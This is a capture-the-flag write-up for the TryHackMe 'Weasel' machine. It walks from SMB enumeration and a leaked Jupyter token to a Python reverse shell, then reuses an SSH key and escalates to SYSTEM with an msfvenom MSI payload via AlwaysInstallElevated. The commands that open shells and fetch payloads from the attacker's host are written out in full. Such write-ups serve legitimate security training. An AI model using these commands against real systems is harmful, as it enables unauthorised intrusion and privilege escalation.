# Weasel

---

Platform: Tryhackme

Difficulty: Medium

Initial Access: Initial Access via Leaked Jupyter Token Discovered Through SMB Enumeration

Privilege Escalation: Misconfigured AlwaysInstallElevated Policy

---

Nmap Scan results:

```bash
┌──(ghost㉿kali)-[~/tryhackme/weasel]
└─$ sudo nmap -Pn -O -sC -A -p- --min-rate=3000 10.10.156.37 -oN nmap.full
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 04:42 EDT
Nmap scan report for 10.10.156.37
Host is up (0.19s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b:17:d8:8a:1e:8c:99:bc:5b:f5:3d:0a:5e:ff:5e:5e (RSA)
|   256 3c:c0:fd:b5:c1:57:ab:75:ac:81:10:ae:e2:98:12:0d (ECDSA)
|_  256 e9:f0:30:be:e6:cf:ef:fe:2d:14:21:a0:ac:45:7b:70 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DEV-DATASCI-JUP
| Not valid before: 2025-07-15T08:40:35
|_Not valid after:  2026-01-14T08:40:35
| rdp-ntlm-info: 
|   Target_Name: DEV-DATASCI-JUP
|   NetBIOS_Domain_Name: DEV-DATASCI-JUP
|   NetBIOS_Computer_Name: DEV-DATASCI-JUP
|   DNS_Domain_Name: DEV-DATASCI-JUP
|   DNS_Computer_Name: DEV-DATASCI-JUP
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-16T08:44:26+00:00
|_ssl-date: 2025-07-16T08:44:36+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8888/tcp  open  http          Tornado httpd 6.0.3
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
|_http-server-header: TornadoServer/6.0.3
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
```

Noteworthy Details:

- **Port 8888 (Jupyter Notebook)**:
    - Web interface found: `/login?next=%2Ftree%3F`
    - Server: `TornadoServer/6.0.3`
    - This could be a good candidate for exploiting via token/session hijacking or misconfig.
- **SMB Ports (139, 445)**:
    - Common attack surface for enumeration, null sessions, or SMBRelay.

---

### Port 445(Samba enumeration)

Let’s check if there are any shares remotely open for us. We can use smbclient tool here.

```bash
┌──(ghost㉿kali)-[~/tryhackme/weasel]
└─$ smbclient  -L '10.10.156.37' 
Password for [WORKGROUP\ghost]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        datasci-team    Disk      
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.156.37 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Interesting share here : “datasci-team”

Connect and have a look inside that share.

```bash
┌──(ghost㉿kali)-[~/tryhackme/weasel]
└─$ smbclient '//10.10.156.37/datasci-team' 
Password for [WORKGROUP\ghost]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Aug 25 11:27:02 2022
  ..                                  D        0  Thu Aug 25 11:27:02 2022
  .ipynb_checkpoints                 DA        0  Thu Aug 25 11:26:47 2022
  Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv      A      146  Thu Aug 25 11:26:46 2022
  misc                               DA        0  Thu Aug 25 11:26:47 2022
  MPE63-3_745-757.pdf                 A   414804  Thu Aug 25 11:26:46 2022
  papers                             DA        0  Thu Aug 25 11:26:47 2022
  pics                               DA        0  Thu Aug 25 11:26:47 2022
  requirements.txt                    A       12  Thu Aug 25 11:26:46 2022
  weasel.ipynb                        A     4308  Thu Aug 25 11:26:46 2022
  weasel.txt                          A       51  Thu Aug 25 11:26:46 2022

                15587583 blocks of size 4096. 8929838 blocks available
```

There are too many files we can check for, but let’s check misc folder and its content.

```bash
smb: \> cd misc
smb: \misc\> ls
  .                                  DA        0  Thu Aug 25 11:26:47 2022
  ..                                 DA        0  Thu Aug 25 11:26:47 2022
  jupyter-token.txt                   A       52  Thu Aug 25 11:26:47 2022

                15587583 blocks of size 4096. 8952153 blocks available
smb: \misc\> get jupyter-token.txt 
getting file \misc\jupyter-token.txt of size 52 as jupyter-token.txt (0.1 KiloBytes/sec) (average 1.9 KiloBytes/sec)
```

Here, we go! jupyter notebook’s access token, looks like we can use this token on port 8888, where jupyter notebook was hosted. Let’s check!

---

### Port 8888

Here, as we were expecting, it requires token to authenticate and we have that token now, let’s authenticate ourself and change password to `pass` . 

<img width="1917" height="795" alt="image" src="https://github.com/user-attachments/assets/6ec03ea9-4bc5-42ac-8561-ba51c353ecce" />

Successfully logged inside of jupyter notebook server.

Here, we can see that same directory which was hosted on smbserver too. 

<img width="1917" height="707" alt="Screenshot_2025-07-17_143618" src="https://github.com/user-attachments/assets/690061ee-44ef-48cc-a9ac-5a229c4602bc" />

Now, we can potentialy edit that weasel.ipynb file and will inject our reverse shell there. Let’s check.

<img width="1918" height="711" alt="Screenshot_2025-07-17_143756" src="https://github.com/user-attachments/assets/fbc46b80-0f36-4e4f-9502-a61369f89c02" />

Can inject this payload here:

```python
import socket,os,pty;s=socket.socket();s.connect(("<ip>",4445));[os.dup2(s.fileno(),fd)for fd in(0,1,2)];pty.spawn("bash")
```

Setup your netcat on listening mode and as we click on run button, we should get reverse shell back on our kali machine.

```bash
┌──(ghost㉿kali)-[~/tryhackme/weasel]
└─$ rlwrap -f . -r nc -nvlp 4445
listening on [any] 4445 ...
connect to [10.17.87.131] from (UNKNOWN) [10.10.156.37] 50448
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ whoami                                      whoami
whoami
dev-datasci
```

---

### Gaining Stable Shell as dev-datasci-lowpriv

While enumerating the directory we get for dev-datasci, we can see that there is file named “`dev-datasci-lowpriv_id_ed25cat dev-datasci-lowpriv_id_ed25519`”which hold a private ssh key.

```bash
(base) dev-datasci@DEV-DATASCI-JUP:~$ cat dev-datasci-lowpriv_id_ed25cat dev-datasci-lowpriv_id_ed25519
cat dev-datasci-lowpriv_id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+YwAAAKjQ358n0N+f
JwAAAAtzc2gtZWQyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+Yw
AAAED9OhQumFOiC3a05K+X6h22gQga0sQzmISvJJ2YYfKZWVSh7llJ7PMLrlRmFa3h1u/E
qiv502CASG53Mr4lKz5jAAAAI2Rldi1kYXRhc2NpLWxvd3ByaXZAREVWLURBVEFTQ0ktSl
VQAQI=
-----END OPENSSH PRIVATE KEY-----
```

Copy these content and paste that into a file named id_rsa inside our kali machine. Give it permission 600. And let’s ssh in to user dev-datasci-lowpriv.

```bash
┌──(ghost㉿kali)-[~/tryhackme/weasel]
└─$ ssh -i id_rsa dev-datasci-lowpriv@10.10.170.128
The authenticity of host '10.10.170.128 (10.10.170.128)' can't be established.
ED25519 key fingerprint is SHA256:YohGOJ6HqUWSa59AODLQL1ppenworD+oYe1xcRv/GrI.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:34: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.170.128' (ED25519) to the list of known hosts.
Microsoft Windows [Version 10.0.17763.3287]
(c) 2018 Microsoft Corporation. All rights reserved.
dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>whoami
dev-datasci-jup\dev-datasci-lowpriv
```

Ok, now we are into a windows shell as user dev-datasci-lowpriv. And we can grab our user flag from this user’s desktop directory.

```bash
dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>cd Desktop 

dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv\Desktop>dir 
 Volume in drive C has no label.                                          
 Volume Serial Number is 8AA3-53D1                                        
                                                                          
 Directory of C:\Users\dev-datasci-lowpriv\Desktop                        
                                                                          
08/25/2022  07:39 AM    <DIR>          .                                  
08/25/2022  07:39 AM    <DIR>          ..                                 
08/25/2022  05:21 AM        28,916,488 python-3.10.6-amd64.exe            
08/25/2022  07:40 AM                27 user.txt                           
               2 File(s)     28,916,515 bytes                             
               2 Dir(s)  36,661,235,712 bytes free                                                                                                  
dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv\Desktop>type user.txt 
THM{REDACTED}
```

---

### Shell as Administrator

For the privesc part, we can go with tool “[privescCheck](https://github.com/itm4n/PrivescCheck)”. We have to simply transfer that powershell script to to target machine, then we can run that.

```bash
dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv\Desktop>certutil.exe -urlcache -f http://10.17.87.131/privescCheck.ps1
 privescCheck.ps1
****  Online  ****
CertUtil: -URLCache command completed successfully.

dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv\Desktop>dir 
 Volume in drive C has no label. 
 Volume Serial Number is 8AA3-53D1

 Directory of C:\Users\dev-datasci-lowpriv\Desktop

07/17/2025  02:52 AM    <DIR>          .
07/17/2025  02:52 AM    <DIR>          ..
07/17/2025  02:52 AM           211,826 privescCheck.ps1
08/25/2022  05:21 AM        28,916,488 python-3.10.6-amd64.exe
08/25/2022  07:40 AM                27 user.txt
               3 File(s)     29,128,341 bytes
               2 Dir(s)  36,662,030,336 bytes free
```

Run that script via powershell.

<img width="1806" height="670" alt="image 1" src="https://github.com/user-attachments/assets/38382aaf-1681-4b22-abfa-8ae35a91a0a2" />

This script discovered a winlogon credentials:

<img width="1866" height="573" alt="image 2" src="https://github.com/user-attachments/assets/74caa0f2-eefd-493d-8959-86e7de334ecc" />

Current user’s login password.

Then, it discovered a severe vulnerablity , AlwaysInstallElevated:

<img width="1880" height="696" alt="image 3" src="https://github.com/user-attachments/assets/ba7748ee-e45d-455c-9653-88be6158bbdd" />


What is this vulnerablity and how can we use that for privilege escalation?

`AlwaysInstallElevated` is a Windows policy setting that, when enabled in both the **HKLM** (machine-wide) and **HKCU** (user-specific) registry hives, allows any user to run Windows Installer `.msi` files with **elevated (SYSTEM)** privileges.

While researching about this vulnerablity, I came on a post by hacking articles about this vulnerablity, where there is a great explanation and simulation of this vulnerablity. You can also check that:

https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/?source=post_page-----d7638cb4ecad---------------------------------------

Let’s just exploit that vulnerablity step by step and gain higher privileges.

1. Create a Malicious MSI Payload
    
    ```bash
    ┌──(ghost㉿kali)-[~/tryhackme/weasel]
    └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.87.131 LPORT=4444 -f msi > exploit.msi
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 460 bytes
    Final size of msi file: 159744 byte
    ```
    
2. Transfer `exploit.msi` to the Victim machine.
    
    ```bash
    ┌──(ghost㉿kali)-[~/tryhackme/weasel]
    └─$ python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    
    PS C:\Users\dev-datasci-lowpriv\Desktop> certutil.exe -urlcache -f http://10.17.87.131/exploit.msi exploit.msi
    ****  Online  ****
    CertUtil: -URLCache command completed successfully.
    ```
    
3. Setup a netcat listner on our kali machine.
    
    ```bash
    ┌──(ghost㉿kali)-[~/tryhackme/weasel]
    └─$ rlwrap -f . -r nc -nvlp 4444
    listening on [any] 4444 ...
    ```
    
4. Run the MSI payload with msiexec as user dev-datasci-lowpriv(password is what we find above for this user.)
    
    ```bash
    PS C:\Users\dev-datasci-lowpriv\Desktop> runas /u:dev-datasci-lowpriv "msiexec /qn /i C:\Users\dev-datasci-lowpriv\Desktop\exploit.msi"
    Enter the password for dev-datasci-lowpriv: 
    Attempting to start msiexec /qn /i exploit.msi as user "DEV-DATASCI-JUP\dev-datasci-lowpriv" ...
    ```
    
5. Enjoy the elevated shell and grab the root flag
    
    ```bash
    C:\Windows\system32>whoami
    whoami
    nt authority\system
    
    C:\Windows\system32>cd C:\Users\Administrator\Desktop
    cd C:\Users\Administrator\Desktop
    
    C:\Users\Administrator\Desktop>dir
    dir
     Volume in drive C has no label.
     Volume Serial Number is 8AA3-53D1
    
     Directory of C:\Users\Administrator\Desktop
    
    08/25/2022  07:40 AM    <DIR>          .
    08/25/2022  07:40 AM    <DIR>          ..
    08/25/2022  06:28 AM             7,085 banner.txt
    08/25/2022  05:14 AM         1,414,600 ChromeSetup.exe
    08/25/2022  05:21 AM        28,916,488 python-3.10.6-amd64.exe
    08/25/2022  07:40 AM                32 root.txt
    08/25/2022  05:43 AM       989,103,226 Ubuntu2004-220404.appxbundle
    08/25/2022  05:54 AM             1,424 Visual Studio Code.lnk
                   6 File(s)  1,019,442,855 bytes
                   2 Dir(s)  36,655,443,968 bytes free
    
    C:\Users\Administrator\Desktop>type root.txt
    type root.txt
    THM{REDACTED}
    ```
    

---

That’s it for this machine.✅
